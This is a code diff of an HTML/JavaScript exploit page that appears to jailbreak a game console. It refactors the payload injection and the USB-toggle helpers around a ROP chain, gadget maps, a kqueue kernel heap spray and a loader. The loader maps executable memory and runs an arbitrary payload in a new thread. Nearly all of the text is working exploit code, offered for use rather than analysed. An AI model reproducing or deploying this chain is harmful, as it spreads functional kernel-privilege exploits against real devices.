@@ -507,7 +507,6 @@ window.rop = function () {
     return this;
 };
 </script>
-
 <script>
 var chain;
 var kchain;
@@ -595,19 +594,6 @@ var ipmi_gadgetmap = {
     "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
 };
 
-//ESP8266 usb functions - stooged
-function disableUSB() {
-var getpl = new XMLHttpRequest();
-getpl.open("POST", "./usboff", true);
-getpl.send(null);
-}
-
-
-function enableUSB() {
-var getpl = new XMLHttpRequest();
-getpl.open("POST", "./usbon", true);
-getpl.send(null);
-}
 
 function userland() {
 
@@ -780,20 +766,40 @@ function userland() {
 }
 
 
+//ESP8266 usb functions - stooged
+function disableUSB() {
+	var getpl = new XMLHttpRequest();
+	getpl.open("POST", "./usboff", true);
+	getpl.send(null);
+}
+
+
+function enableUSB() {
+	var getpl = new XMLHttpRequest();
+	getpl.open("POST", "./usbon", true);
+	getpl.send(null);
+}
+
 function injectPayload() //single payload inject for both conditions/removed need for binloader/netcat etc - stooged
 {
-	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-	##PAYLOAD##
-    var payload_loader = p.malloc32(##BUF##);
-    var loader_writer = payload_loader.backing;
-    for(var i=0; i < (payload.length - 1); i++)
-    {
-	    loader_writer[i] = payload[i];
-    }
-    chain.syscall(74, payload_loader, ##BUF##, (0x1 | 0x2 | 0x4));
-    var pthread = p.malloc(0x10);
-    chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
-    ghdone();
+	if (chain.syscall(23, 0).low == 0) {
+        var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+        ##PAYLOAD##
+        var payload_loader = p.malloc32(##BUF##);
+        var loader_writer = payload_loader.backing;
+        for(var i=0; i < (payload.length - 1); i++)
+        {
+            loader_writer[i] = payload[i];
+        }
+        chain.syscall(74, payload_loader, ##BUF##, (0x1 | 0x2 | 0x4));
+        var pthread = p.malloc(0x10);
+        chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+        ghdone();
+	}
+	else
+	{
+        p.write8(0, 0);
+	}
 }
 
 
@@ -804,9 +810,8 @@ function run_hax() {
        kernel();
 	   //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
     }
-	else { // load payload mod / html payloads - stooged
+	// load payload mod / html payloads - stooged
 	injectPayload();
-	}
 }
 
 
@@ -1100,8 +1105,6 @@ var trigger_spray = function () {
 	enableUSB();
 	alert("Click OK When You See The Popup Notification");
 	
-   // alert("Insert USB Drive And Click OK When You See The Popup Notification");
-	//alert("Remove The USB Drive And Click OK To Continue ...");
     //Trigger corrupt knote
     {
         for (var i = 1; i < NUM_KQUEUES; i += 2) {
@@ -1109,24 +1112,16 @@ var trigger_spray = function () {
         }
     }
     chain.run();
-if (chain.syscall(23, 0).low == 0) {
-	//direct loading of GoldHEN - Leeful MOD(removed)
-	//replaced with single inject for both conditions of exploit for ESP8266 boards and html payloads - stooged
+	if (chain.syscall(23, 0).low == 0) {
+		disableUSB();
+		return;
+	}
 	disableUSB();
-	injectPayload();
-	return;
-}
-
-else {
-	disableUSB();
-	alert("exploit failed (kernel heap might be fucked, try again or reboot the console");
-	//alert("exploit failed (kernel heap might be fucked if you *did* insert the USB");
+	alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
     p.write8(0, 0);
 	return;
 }
-}
 </script>
-
 <script>
 var PAGE_SIZE = 16384;
 var SIZEOF_CSS_FONT_FACE = 0xb8;
